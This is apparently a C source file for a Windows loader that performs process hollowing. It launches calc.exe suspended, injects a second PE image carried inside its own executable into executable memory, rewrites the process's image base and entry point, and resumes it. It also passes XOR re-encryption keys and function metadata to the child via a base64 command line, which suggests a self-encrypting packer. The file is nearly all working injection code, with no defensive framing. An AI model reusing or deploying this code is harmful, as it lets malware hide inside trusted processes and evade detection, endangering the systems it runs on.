#include "loader.h"

LONG getPEphysicalSize(const char* peFilePath, long address) {
    // Open the PE file
    FILE* file = fopen(peFilePath, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return 0;
    }

    // Seek to the specified offset
    if (fseek(file, (long)address, SEEK_SET) != 0) {
        fprintf(stderr, "Failed to seek to offset: 0x%lx\n", address);
        fclose(file);
        return 0;
    }

    // Read the DOS Header
    IMAGE_DOS_HEADER dosHeader;
    if (fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file) != 1) {
        fprintf(stderr, "Failed to read DOS header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'MZ' signature
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid DOS header)\n");
        fclose(file);
        return 0;
    }

    // Move to the NT Header, which is located at dosHeader.e_lfanew
    if (fseek(file, dosHeader.e_lfanew + address, SEEK_SET) != 0) {
        fprintf(stderr, "Failed to seek to NT header\n");
        fclose(file);
        return 0;
    }

    // Read the NT Header
    IMAGE_NT_HEADERS ntHeaders;
    if (fread(&ntHeaders, sizeof(IMAGE_NT_HEADERS), 1, file) != 1) {
        fprintf(stderr, "Failed to read NT header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'PE\0\0' signature
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid NT header)\n");
        fclose(file);
        return 0;
    }

    // Calculate the PE file size
    LONG fileSize = ntHeaders.OptionalHeader.SizeOfHeaders;
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER sectionHeader;
        if (fread(&sectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file) != 1) {
            fprintf(stderr, "Failed to read section header\n");
            fclose(file);
            return 0;
        }

        fileSize += sectionHeader.SizeOfRawData;
    }

    fclose(file);
    return fileSize;
}

void* loadFileToMemory(const char* peFilePath, PLONG fileSize) {
    // Open the file in binary read mode
    FILE* file = fopen(peFilePath, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return NULL;
    }

    // Get the size of the file by seeking to the end
    fseek(file, 0, SEEK_END);
    *fileSize = ftell(file);  // Get the current file pointer, which is the size of the file
    fseek(file, 0, SEEK_SET);  // Reset the file pointer to the beginning

    // Allocate memory to hold the file content
    void* fileData = malloc(*fileSize);
    if (!fileData) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        return NULL;
    }

    // Read the entire file into memory
    if (fread(fileData, 1, *fileSize, file) != *fileSize) {
        fprintf(stderr, "Failed to read the entire file\n");
        free(fileData);
        fclose(file);
        return NULL;
    }

    // Close the file after reading
    fclose(file);

    return fileData;
}

void fixIAT(UINT_PTR baseAddress) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (importDir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(baseAddress + importDir->VirtualAddress);
        while (importDesc->Name) {
            char* moduleName = (char*)(baseAddress + importDesc->Name);
            HMODULE moduleHandle = LoadLibraryA(moduleName);
            if (moduleHandle) {
                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(baseAddress + importDesc->FirstThunk);
                while (thunk->u1.Function) {
                    IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(baseAddress + thunk->u1.AddressOfData);
                    FARPROC procAddress = GetProcAddress(moduleHandle, importByName->Name);
                    thunk->u1.Function = (UINT_PTR)procAddress;
                    thunk++;
                }
            }
            importDesc++;
        }
    }
}

// https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/
size_t b64_encoded_size(size_t inlen)
{
    size_t ret;

    ret = inlen;
    if (inlen % 3 != 0)
        ret += 3 - (inlen % 3);
    ret /= 3;
    ret *= 4;

    return ret;
}

char *b64_encode(const unsigned char *in, size_t len)
{
    char   *out;
    size_t  elen;
    size_t  i;
    size_t  j;
    size_t  v;

    if (in == NULL || len == 0)
        return NULL;

    elen = b64_encoded_size(len);
    out  = malloc(elen+1);
    out[elen] = '\0';

    for (i=0, j=0; i<len; i+=3, j+=4) {
        v = in[i];
        v = i+1 < len ? v << 8 | in[i+1] : v << 8;
        v = i+2 < len ? v << 8 | in[i+2] : v << 8;

        out[j]   = b64chars[(v >> 18) & 0x3F];
        out[j+1] = b64chars[(v >> 12) & 0x3F];
        if (i+1 < len) {
            out[j+2] = b64chars[(v >> 6) & 0x3F];
        } else {
            out[j+2] = '=';
        }
        if (i+2 < len) {
            out[j+3] = b64chars[v & 0x3F];
        } else {
            out[j+3] = '=';
        }
    }

    return out;
}

void writeSharedMemory(char **commandline) {
    // Function info
    FunctionInfo* functions = NULL;
    size_t numFunctions = 0;
    functions = analyzeExecutable(&numFunctions);
    if (functions == NULL || numFunctions == 0) {
        fprintf(stderr, "No functions found or failed to analyze executable.\n");
        return;
    }

    // Base address of the loaded module
    UINT_PTR baseAddress = (UINT_PTR)GetModuleHandle(NULL);
    if (baseAddress == 0) {
        fprintf(stderr, "Failed to get the base address of the module.\n");
        return;
    }

    // Decryption key
    srand(time(NULL));
    unsigned char nextEncryptionKey = (unsigned char)(rand() % 256);

    // Encryption key
    unsigned char encryptionKey = 0x00;
    encryptionKey = *((unsigned char *)(baseAddress + getMetaSectionAddress(baseAddress) + getMetaSectionVirtualSize(baseAddress) - sizeof(encryptionKey)));
    if (encryptionKey == 0x00) {
        printf("Encryption Key not found.\n");
        free(functions);
        return;
    }
    unsigned char recryptionKey = nextEncryptionKey ^ encryptionKey;

    // Current executable path
    char executablePath[512] = {0};
    if (GetModuleFileName(NULL, executablePath, sizeof(executablePath)) == 0) {
        fprintf(stderr, "Error getting executable path: %ld\n", GetLastError());
        free(functions);
        return;
    }

    // Key address
    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);

    ProcessData data = {0};
    strncpy(data.executablePath, executablePath, sizeof(executablePath));
    data.numFunctions = numFunctions;
    data.functions = functions;
    data.recryptionKey = recryptionKey;
    data.nextEncryptionKey = nextEncryptionKey;
    data.keyAddress = keyAddress;
    /*
    typedef struct {
        ULONGLONG virtualAddress; // RVA offset
        ULONGLONG physicalAddress; // File offset
        ULONGLONG size; // Size of the function in memory (it might error on disk... i'll take my chances for now)
        char name[64];        // Name of the function
    } FunctionInfo;
    */
    printf("Executable Path: %s\n", executablePath);
    printf("Number of Functions: %zu\n", numFunctions);
    for (size_t i = 0; i < numFunctions; ++i) {
        printf("Function %zu:\tVA: 0x%08llX, PA: 0x%08llX, S: %08llu, N: %s\n", i, functions[i].virtualAddress, functions[i].physicalAddress, functions[i].size, functions[i].name);
    }
    printf("Recryption Key: 0x%hhX\n", recryptionKey);
    printf("Next Encryption Key: 0x%hhX\n", nextEncryptionKey);
    printf("Key Address: 0x%08llu\n\n", keyAddress);

    // Make sure size is sufficient
    size_t total_size = sizeof(numFunctions) +  // numFunctions
                        sizeof(recryptionKey) + // recryptionKey
                        sizeof(nextEncryptionKey) + // nextEncryptionKey
                        sizeof(keyAddress) + // keyAddress
                        sizeof(executablePath); // executablePath

    // Add size of functions
    for (size_t i = 0; i < data.numFunctions; ++i) {
        total_size += sizeof(ULONGLONG) + sizeof(ULONGLONG) + sizeof(ULONGLONG) + sizeof(((FunctionInfo*)0)->name);
    }

    total_size += 1;

    printf("Total Size: 0x%04llX\n", total_size);

    unsigned char *buffer = (unsigned char *)malloc(total_size);
    if (!buffer) {
        fprintf(stderr, "Failed to allocate memory for buffer\n");
        return;
    }

    unsigned char *ptr = buffer;

    // Serialize executablePath
    memcpy(ptr, executablePath, sizeof(executablePath));
    ptr += sizeof(executablePath);

    // Serialize numFunctions
    memcpy(ptr, &numFunctions, sizeof(numFunctions));
    ptr += sizeof(numFunctions);

    // Serialize FunctionInfo array
    for (size_t i = 0; i < numFunctions; ++i) {
        memcpy(ptr, &(functions[i].virtualAddress), sizeof(ULONGLONG));
        ptr += sizeof(ULONGLONG);
        memcpy(ptr, &(functions[i].physicalAddress), sizeof(ULONGLONG));
        ptr += sizeof(ULONGLONG);
        memcpy(ptr, &(functions[i].size), sizeof(ULONGLONG));
        ptr += sizeof(ULONGLONG);
        memcpy(ptr, &(functions[i].name), sizeof(((FunctionInfo*)0)->name));
        ptr += sizeof(((FunctionInfo*)0)->name);
        printf("Current Idx: 0x%04llX\n", ptr - buffer);
    }

    // Serialize recryptionKey
    memcpy(ptr, &recryptionKey, sizeof(recryptionKey));
    ptr += sizeof(recryptionKey);

    // Serialize nextEncryptionKey
    memcpy(ptr, &nextEncryptionKey, sizeof(nextEncryptionKey));
    ptr += sizeof(nextEncryptionKey);

    // Serialize keyAddress
    memcpy(ptr, &keyAddress, sizeof(keyAddress));
    ptr += sizeof(keyAddress);

    // Base64 encode the serialized data
    *commandline = b64_encode((const unsigned char *)buffer, total_size);
    if (*commandline) {
        printf("Base64 encoded data: %s\n", *commandline);
    } else {
        fprintf(stderr, "Failed to base64 encode the data\n");
    }

    free(buffer);
}

IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;

    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + pe_offset);
    return inh;
}

IMAGE_DATA_DIRECTORY* get_pe_directory64(PVOID pe_buffer, DWORD dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {       
        return NULL;
    }
        
    //fetch relocation table from current image:
    PIMAGE_NT_HEADERS nt_headers = get_nt_hdrs((BYTE*) pe_buffer);
    if (nt_headers == NULL) {       
        return NULL;
    }

    IMAGE_DATA_DIRECTORY* peDir = &(nt_headers->OptionalHeader.DataDirectory[dir_id]);
    
    if (((PVOID) ((DWORD64) peDir->VirtualAddress)) == NULL) {          
        return NULL;
    }   
    
    return peDir;
}

BOOL apply_reloc_block64(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, ULONGLONG oldBase, ULONGLONG newBase, PVOID modulePtr)
{
    DWORD *relocateAddr32;
    ULONGLONG *relocateAddr64;
    BASE_RELOCATION_ENTRY* entry = block;
    SIZE_T i = 0;
    for (i = 0; i < entriesNum; i++) {
        DWORD offset = entry->Offset;
        DWORD type = entry->Type;
        
        if (entry == NULL || type == 0) {
            break;
        }
                
        switch(type) {
            case RELOC_32BIT_FIELD:
                relocateAddr32 = (DWORD*) ((ULONG_PTR) modulePtr + page + offset);
                (*relocateAddr32) = (DWORD) (*relocateAddr32) - oldBase + newBase;
                entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD)); 
                break;
            case RELOC_64BIT_FIELD:
                relocateAddr64 = (ULONGLONG*) ((ULONG_PTR) modulePtr + page + offset);
                (*relocateAddr64) = ((ULONGLONG) (*relocateAddr64)) - oldBase + newBase;
                entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD)); 
                break;          
            default:
                printf("Not supported relocations format at %d: %lu\n", (int) i, type);
                return FALSE;
        }                               
                
    }
    return TRUE;        
}


BOOL apply_relocations64(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory64(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (relocDir == NULL) {
        printf("Cannot relocate - application have no relocation table!\n");
        return FALSE;
    }
    DWORD maxSize = relocDir->Size;
    DWORD relocAddr = relocDir->VirtualAddress;

    IMAGE_BASE_RELOCATION* reloc = NULL;

    DWORD parsedSize = 0;
    while (parsedSize < maxSize) {
        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + (ULONG_PTR) modulePtr);
        parsedSize += reloc->SizeOfBlock;
        
        if ((((ULONGLONG*) ((ULONGLONG) reloc->VirtualAddress)) == NULL) || (reloc->SizeOfBlock == 0)) {
            continue;
        }
        
        size_t entriesNum = (reloc->SizeOfBlock - 2 * sizeof(DWORD))  / sizeof(WORD);
        DWORD page = reloc->VirtualAddress;

        BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) reloc + sizeof(DWORD) + sizeof(DWORD));
        if (apply_reloc_block64(block, entriesNum, page, oldBase, newBase, modulePtr) == FALSE) {
            return FALSE;
        }
    }
    return TRUE;
}

void hollowing() {
    // 1. Create the target process in a suspended state
    STARTUPINFOA tStartupInformation = {0};
    PROCESS_INFORMATION tProcessInformation = {0};
    
    tStartupInformation.cb = sizeof(STARTUPINFOA);
    
    char getPath[MAX_PATH];
    DWORD result = GetModuleFileNameA(NULL, getPath, MAX_PATH);
    LPCSTR hName = (LPCSTR)getPath;
    LPCSTR tName = "C:\\Windows\\System32\\calc.exe";

    char *commandline = NULL;
    writeSharedMemory(&commandline);

    BOOL success = CreateProcessA(
        tName,
        commandline,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // DETACHED_PROCESS | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP |
        NULL,
        NULL,
        &tStartupInformation,
        &tProcessInformation
    );

    //free(commandline);

    if (!success) {
        printf("CreateProcessA failed with error code %lu\n", GetLastError());
        return;
    }

    printf("Process created successfully\n");
    printf("Process ID: %lu\n", tProcessInformation.dwProcessId);



    // 2. Retrieve the target process context and read the ImageBase
    long firstPEFileSize = getPEphysicalSize(hName, 0);
    long secondPEFileSize = getPEphysicalSize(hName, firstPEFileSize);
    long PEFileSize = firstPEFileSize + secondPEFileSize;
    printf("File Size of PE1: %08lu \tFile Size of PE2: %08lu\n", firstPEFileSize, secondPEFileSize);
    printf("Total File Size of PE: %08lu\n", PEFileSize);
    void* file = loadFileToMemory(hName, &PEFileSize);
    DWORD64 otImageBase;
    DWORD64 desiredPayloadImageBase;

    CONTEXT tContext;
    tContext.ContextFlags = CONTEXT_FULL;

    success = GetThreadContext(tProcessInformation.hThread, (LPCONTEXT) &tContext);

    if(!success) {
        printf("GetThreadContext failed with error code %lu\n", GetLastError());
        free(file);
        return;
    }

    PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)(file + firstPEFileSize);
    PIMAGE_NT_HEADERS payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);

    // Patch payload subsystem to avoid crashes
    payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

    success = ReadProcessMemory(tProcessInformation.hProcess, (LPCVOID) (tContext.Rdx + 16), (LPVOID) (&otImageBase), sizeof(DWORD64), NULL);

    if(!success) {
        printf("ReadProcessMemory failed with error code %lu\n", GetLastError());
        free(file);
        return;
    }

    printf("Old target process image base is 0x%llX\n", otImageBase);

    desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
    printf("Desired image base of payload is 0x%llX\n", payloadNtHeader->OptionalHeader.ImageBase); 



    // 3. Unmap View of calc Process... probably not a good idea. it's virtual memory, but i still don't want to randomly unmap a random section
    /*
    NtUnmapViewOfSection(
        IN HANDLE               ProcessHandle,
        IN PVOID                BaseAddress );
    */



    // 4. Allocate memory for the payload
    DWORD64 newTargetImageBase;
    newTargetImageBase = (DWORD64) VirtualAllocEx(tProcessInformation.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("New memory region has size 0x%lX bytes, at address 0x%llX.\n", payloadNtHeader->OptionalHeader.SizeOfImage, newTargetImageBase);

    payloadNtHeader->OptionalHeader.ImageBase = newTargetImageBase;
    printf("Adjusted OptionalHeader.ImageBase in payload to point to the actually allocated memory in target process.\n");



    // 5. Copy payload headers and sections to allocated memory
    LPVOID localPayloadCopy;
    PIMAGE_SECTION_HEADER payloadSectionHeader;
    localPayloadCopy = VirtualAlloc(NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(localPayloadCopy, file + firstPEFileSize, payloadNtHeader->OptionalHeader.SizeOfHeaders);
    printf("Wrote payload headers into local copy.\n");

    for(int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
        payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        memcpy((BYTE *) localPayloadCopy + payloadSectionHeader->VirtualAddress, (BYTE *) file + firstPEFileSize + payloadSectionHeader->PointerToRawData, payloadSectionHeader->SizeOfRawData);
        printf("Wrote section %d to local copy, virtual address offset of section is 0x%lX.\n", i, payloadSectionHeader->VirtualAddress);      
    }



    // 6. Apply relocations on the local payload copy
    if(newTargetImageBase != desiredPayloadImageBase) {
        printf("Payload not mapped at desired image base, applying relocations...\n");
        if(apply_relocations64((ULONGLONG) newTargetImageBase, (ULONGLONG) desiredPayloadImageBase, localPayloadCopy) == FALSE) {
            printf("Applying relocations to local copy failed.\n");
            return;
        } else {
            printf("Applied relocations to local payload copy.\n");
        }
    } else {
        printf("Image is at desired base, skipping relocations.\n");
    } // do i need to fix iat here? we'll see



    // 7. Writing the payload into the target process
    success = WriteProcessMemory(tProcessInformation.hProcess, (LPVOID) newTargetImageBase, localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, NULL);
    if(success == 0) {
        printf("Failed to write local payload copy into target process.\n");
        return;
    } else {
        printf("Wrote local payload copy into target process.\n");
    }



    // 8. Adjusting the target's PEB (Image Base, Thread Context)
    success = WriteProcessMemory(tProcessInformation.hProcess, (LPVOID) (tContext.Rdx + 16), (LPCVOID) &newTargetImageBase, sizeof(DWORD64), NULL);
    if(success == 0) {
        printf("Failed to fix target image base in PEB.\n");
        return;
    } else { 
        printf("Fixed target image base in PEB to 0x%llX\n", newTargetImageBase);
    }

    tContext.Rcx = newTargetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
    if(!SetThreadContext(tProcessInformation.hThread, &tContext)) {
        printf("Setting thread context for target main thread failed.\n");
        return;
    } else {
        printf("Set thread context for target main thread. New entry point is 0x%llX.\n", tContext.Rcx);
    }



    // 9. Cleanup local memory
    free(file);
    VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);



    // 10. Resume target main thread
    if(ResumeThread(tProcessInformation.hThread) == -1) {
        printf("Failed to resume target main thread.\n");
    } else {
        printf("Resumed target main thread.\n");
    }



    // 11. Close local handles or exit program entirely for the kernel to clean them
    CloseHandle(tProcessInformation.hThread);
    CloseHandle(tProcessInformation.hProcess);
}